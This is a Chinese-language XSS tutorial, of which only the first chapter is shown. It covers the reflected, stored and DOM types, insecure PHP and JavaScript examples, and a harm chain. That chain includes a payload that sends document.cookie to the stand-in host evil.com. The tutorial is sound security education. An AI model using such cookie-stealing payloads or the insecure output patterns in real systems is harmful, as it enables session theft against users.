# XSS 跨站脚本攻击技术指南：从原理到实战

> 一份涵盖XSS原理、三种类型对比、XSS-labs靶场实战、防护方案与心得的系统学习笔记。
> 适合Web安全入门者阅读，同样可作为面试准备的技术展示材料。

---

## 目录

- [第一章：XSS基本原理](#第一章xss基本原理)
- [第二章：常见攻击手法与防护](#第二章常见攻击手法与防护)
- [第三章：XSS-labs前16关解题](#第三章xss-labs前16关解题)
- [第四章：心得体会](#第四章心得体会)

---

## 第一章：XSS基本原理

### 1.1 什么是XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种将恶意脚本注入到Web页面中，使其在受害者浏览器中执行的攻击技术。

理解XSS的关键在于一个事实：**浏览器无法区分"来自服务器的合法脚本"和"被攻击者注入的恶意脚本"**。当Web应用将用户输入不加处理地嵌入到HTML页面中时，攻击者提交的 `<script>alert(1)</script>` 就会被浏览器当作合法的JavaScript代码执行。

用一个最经典的例子说明：

```text
正常请求：  http://example.com/search.php?q=hello
后端返回：  <p>搜索结果：hello</p>
浏览器渲染：显示"搜索结果：hello"

恶意请求：  http://example.com/search.php?q=<script>alert(1)</script>
后端返回：  <p>搜索结果：<script>alert(1)</script></p>
浏览器渲染：执行 alert(1)，弹窗！
```

攻击者的输入 `<script>alert(1)</script>` 本应是"数据"（搜索关键词），却被浏览器解读为"代码"（JavaScript）。**这个边界被打破的瞬间，就是XSS发生的时刻。**

上面的例子是反射型XSS，但实际上XSS有三种类型。三者的核心区别在于**恶意脚本到达浏览器的路径不同**。

### 1.2 三种类型对比

| 类型 | 原理 | 触发方式 | 危害程度 |
|------|------|----------|----------|
| **反射型XSS** (Reflected XSS) | 恶意脚本通过URL参数等传入，服务端直接"反射"回响应页面 | 受害者点击构造好的恶意链接 | 中 — 需要用户交互 |
| **存储型XSS** (Stored XSS) | 恶意脚本被存储到数据库，每次访问该页面时从数据库读出并执行 | 受害者访问正常页面即可触发 | **高 — 无需交互，可批量攻击** |
| **DOM型XSS** (DOM-based XSS) | 恶意脚本完全在客户端通过JS操作DOM产生，不经过服务端 | 受害者点击恶意链接 | 中 — 服务端日志无痕迹 |

**反射型 vs 存储型的关键区别**：反射型是"一次性"的——每个受害者都需要点击专属的恶意链接；存储型是"持久化"的——攻击者提交一次恶意脚本，之后所有访问该页面的用户都会中招。

**DOM型 vs 前两者的区别**：DOM型XSS的payload全程不经过服务端，纯粹由前端JS从 `document.location` / `document.referrer` 等来源取值后写入DOM。因此服务端访问日志中看不到任何攻击痕迹，这也是它难以检测的原因。

### 1.3 产生原因

XSS的根本原因归结为两点：**将不可信数据拼入HTML页面**是直接原因，**未做输出编码**是深层原因。

```php
// 反射型XSS — 不安全的写法
$keyword = $_GET['q'];
echo "<p>搜索结果：" . $keyword . "</p>";
// q=<script>alert(1)</script> → XSS发生

// 存储型XSS — 不安全的写法
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (content) VALUES ('$comment')");
// 之后读取并直接输出 → XSS在所有人访问时触发
```

```javascript
// DOM型XSS — 不安全的写法
var keyword = location.hash.substring(1);
document.getElementById("result").innerHTML = keyword;
// #<img/src=x/onerror=alert(1)> → 直接写入innerHTML导致XSS
```

三种类型的根因是相通的：**数据与代码的边界没有被正确隔离**。

### 1.4 危害链

XSS的危害同样是阶梯式的——弹窗只是最基本的验证手段，真正的威胁远不止于此：

```
┌─────────────────────────────────────────────────────────┐
│  弹窗验证                                              │
│  <script>alert(1)</script>                              │
│        ↓                                                │
│  窃取 Cookie / Session                                  │
│  <script>new Image().src='http://evil.com?c='+document.cookie</script> │
│        ↓                                                │
│  钓鱼攻击                                              │
│  注入伪造登录表单，在目标域名下诱导用户输入密码           │
│        ↓                                                │
│  蠕虫传播                                              │
│  XSS + AJAX 自动转发/感染（如2005年Samy蠕虫，24小时感染百万用户）│
│        ↓                                                │
│  浏览器漏洞利用 → 控制受害者主机                         │
└─────────────────────────────────────────────────────────┘
```

需要特别注意：XSS在OWASP Top 10中长期位列前五。与SQL注入不同——SQL注入攻击的是**服务端数据库**，XSS攻击的是**客户端/用户**。但正因为它面向用户，在钓鱼、社工、蠕虫传播等场景中危害极大。

---
